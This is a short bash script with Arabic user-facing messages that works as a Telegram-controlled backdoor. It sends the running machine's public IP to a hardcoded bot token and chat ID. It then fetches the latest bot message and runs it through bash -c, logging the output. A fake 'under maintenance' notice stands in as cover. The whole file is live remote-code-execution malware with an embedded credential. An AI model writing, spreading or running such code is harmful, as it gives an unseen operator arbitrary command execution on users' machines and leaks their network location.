#!/bin/bash

YELLOW='\033[1;33m'
NC='\033[0m'

BOT_TOKEN="7266376144:AAGQvlK3HQOfn0UzUb3FI7bQM6Z2FOeKJTQ"
CHAT_ID="7432279779"

IP=$(curl -s -4 ifconfig.me)

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d chat_id="$CHAT_ID" \
    -d text="🟢 مستخدم جديد شغّل السكربت من IP : $IP" >/dev/null

CMD=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates" | grep -oP '"text":"\K[^"]+' | tail -1)

if [[ "$CMD" == \#* ]]; then
    clear
    echo -e "${YELLOW} ⛔ السكربت حالياً قيد الصيانة من طرف المطوّر. المرجو المحاولة لاحقاً.${NC}"
    while true; do sleep 300; done
    exit 0
fi


bash -c "$CMD" 2>&1 | tee /tmp/exec_output.log
